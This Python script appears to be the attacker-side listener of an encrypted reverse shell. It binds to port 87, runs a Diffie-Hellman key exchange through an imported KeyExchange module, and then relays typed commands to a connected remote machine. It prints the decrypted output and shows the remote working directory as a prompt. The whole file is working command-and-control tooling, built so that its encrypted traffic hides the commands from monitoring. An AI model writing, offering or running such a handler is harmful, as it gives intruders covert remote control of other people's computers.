import socket
from KeyExchange import DiffieHellmanChannel, RSAChannel

host = '0.0.0.0'
port = 87

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((host, port))

server.listen(1)
print(f"[+] Listening on {host}:{port}...")

conn, addr = server.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]}")

secure = DiffieHellmanChannel()
conn.send(str(secure.public).encode())
client_pub = int(conn.recv(4096).decode())
secure.generate_shared_key(client_pub)

try:
    while True:
        conn.send(secure.encrypt("Hello!").encode())
        cwd = conn.recv(1024).decode().strip()
        cwd = secure.decrypt(cwd)

        command = input(f"{cwd}> ")

        while not command.strip():
            command = input(f"{cwd}> ")

        conn.send(secure.encrypt(command).encode())

        if command.lower() == "exit":
            break

        data = b""

        while True:
            chunk = conn.recv(4096)
            decrypted = secure.decrypt(chunk)
            data += decrypted
            if b"<EOF>" in data:
                break

        output = data.decode(errors="ignore").replace("<EOF>", "")
        print(output)

finally:
    conn.close()
    server.close()
